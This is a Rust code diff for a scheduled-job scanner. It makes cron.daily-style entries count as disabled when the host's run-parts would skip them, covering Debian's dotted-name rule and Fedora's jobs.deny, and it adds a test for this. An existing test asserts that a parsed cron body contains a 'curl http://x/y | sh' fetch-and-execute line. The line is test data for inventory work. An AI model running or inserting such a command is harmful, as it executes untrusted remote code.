@@ -161,6 +161,7 @@ fn crontab(cx: &mut Ctx, rel: &Path, layout: Layout<'_>, out: &mut Vec<Entry>) {
 /// itself is the target, and the schedule comes from the directory.
 fn run_parts(cx: &mut Ctx, period: &str, out: &mut Vec<Entry>) {
     let dir = format!("etc/cron.{period}");
+    let flavour = super::run_parts_flavour(cx);
     for ent in cx.dir(&dir) {
         if ent.is_dir {
             continue;
@@ -173,8 +174,13 @@ fn run_parts(cx: &mut Ctx, period: &str, out: &mut Vec<Entry>) {
         e.target_path = Some(cx.root.abs(&rel));
         e.note("schedule", format!("@{period}"));
         // run-parts runs what is executable and skips the rest, which is how
-        // a .dpkg-old copy of a script stops running.
+        // a .dpkg-old copy of a script stops running, and passes over a name
+        // its own rule does not select.
         e.enabled = if e.mode & 0o111 != 0 { Enablement::Enabled } else { Enablement::Disabled };
+        if let Some(why) = super::run_parts_skips(cx, flavour, Path::new(&dir), ent.name.as_bytes()) {
+            e.enabled = Enablement::Disabled;
+            e.note("not_run", why);
+        }
         out.push(e);
     }
 }
@@ -820,6 +826,25 @@ mod tests {
         let body = text(e);
         assert!(body.starts_with("${SHELL:-/bin/sh}"), "the body starts below the generated header: {body:?}");
         assert!(body.contains("/usr/bin/curl http://x/y | sh"));
+        std::fs::remove_dir_all(&dir).unwrap();
+    }
+
+    #[test]
+    fn cron_directories_follow_the_hosts_run_parts() {
+        let dir = tree("runparts");
+        put(&dir, "etc/cron.daily/backup.sh", b"#!/bin/sh\n");
+        chmod(&dir, "etc/cron.daily/backup.sh", 0o755);
+        put(&dir, "etc/cron.daily/rotate", b"#!/bin/sh\n");
+        chmod(&dir, "etc/cron.daily/rotate", 0o755);
+        let s = scan(&dir);
+        assert_eq!(named(&s, "backup.sh").enabled, Enablement::Disabled, "debianutils runs no dotted name");
+        assert_eq!(named(&s, "rotate").enabled, Enablement::Enabled);
+
+        put(&dir, "usr/bin/run-parts", b"#!/bin/bash\n");
+        put(&dir, "etc/cron.daily/jobs.deny", b"rotate\n");
+        let s = scan(&dir);
+        assert_eq!(named(&s, "backup.sh").enabled, Enablement::Enabled, "Fedora's script does");
+        assert_eq!(named(&s, "rotate").raw["not_run"], "named in jobs.deny");
         std::fs::remove_dir_all(&dir).unwrap();
     }
 }
